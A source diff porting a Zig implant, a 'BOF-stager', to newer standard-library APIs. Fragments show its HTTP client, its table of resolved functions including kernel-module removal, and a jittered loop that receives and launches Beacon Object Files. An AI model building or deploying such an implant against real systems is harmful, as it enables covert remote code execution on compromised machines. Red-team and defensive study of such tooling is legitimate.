@@ -21,16 +21,16 @@ const ImplantActions = struct {
     kmodRemove: ?*const fn (mod_name: [*:0]const u8, flags: u32) callconv(.c) c_int = null,
 
     pub fn attachFunctionality(self: *Self, bofObj: bof.Object) void {
-        const fields = @typeInfo(Self).@"struct".fields;
+        const field_names = @typeInfo(Self).@"struct".field_names;
 
-        var ptr_table: [fields.len]usize = undefined;
+        var ptr_table: [field_names.len]usize = undefined;
 
-        inline for (fields, 0..) |_, i| {
+        inline for (field_names, 0..) |_, i| {
             ptr_table[i] = @intFromPtr(self) + i * @sizeOf(usize);
         }
 
-        inline for (fields, 0..) |field, i| {
-            @as(*usize, @ptrFromInt(ptr_table[i])).* = @intFromPtr(bofObj.getProcAddress(field.name));
+        inline for (field_names, 0..) |field_name, i| {
+            @as(*usize, @ptrFromInt(ptr_table[i])).* = @intFromPtr(bofObj.getProcAddress(field_name));
         }
     }
 };
@@ -88,7 +88,7 @@ const State = struct {
     pending_bofs: std.array_list.Managed(PendingBof),
     persistent_bofs: std.AutoHashMap(u64, bof.Object),
 
-    fn init(allocator: std.mem.Allocator) !State {
+    fn init(allocator: std.mem.Allocator, io: std.Io) !State {
         const base64_decoder = std.base64.Base64Decoder.init(std.base64.standard_alphabet_chars, '=');
         const base64_encoder = std.base64.Base64Encoder.init(std.base64.standard_alphabet_chars, '=');
 
@@ -116,6 +116,7 @@ const State = struct {
 
         const http_client: std.http.Client = .{
             .allocator = allocator,
+            .io = io,
             .http_proxy = http_proxy,
         };
 
@@ -227,7 +228,7 @@ fn receiveAndLaunchBof(allocator: std.mem.Allocator, state: *State, root: std.js
 
             std.log.info("buf: {s} {s}", .{ arg, buf.? });
 
-            const trimmed_buf = std.mem.trimRight(u8, buf.?, "\n");
+            const trimmed_buf = std.mem.trimEnd(u8, buf.?, "\n");
 
             const buf_len = try std.fmt.allocPrint(allocator, "i:{d}", .{trimmed_buf.len});
             defer allocator.free(buf_len);
@@ -455,14 +456,12 @@ fn processPendingBofs(allocator: std.mem.Allocator, state: *State) !void {
     }
 }
 
-pub fn main() !void {
-    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
-    defer _ = gpa.deinit();
-    const allocator = gpa.allocator();
+pub fn main(init: std.process.Init) !void {
+    const allocator = init.gpa;
 
     std.log.info("BOF-stager launched", .{});
 
-    var state = try State.init(allocator);
+    var state = try State.init(allocator, init.io);
     defer state.deinit(allocator);
 
     try bof.initLauncher();
@@ -471,6 +470,6 @@ pub fn main() !void {
     while (true) {
         processCommands(allocator, &state) catch {};
         processPendingBofs(allocator, &state) catch {};
-        std.Thread.sleep(jitter * 1e9);
+        init.io.sleep(.fromSeconds(jitter), .real) catch {};
     }
 }
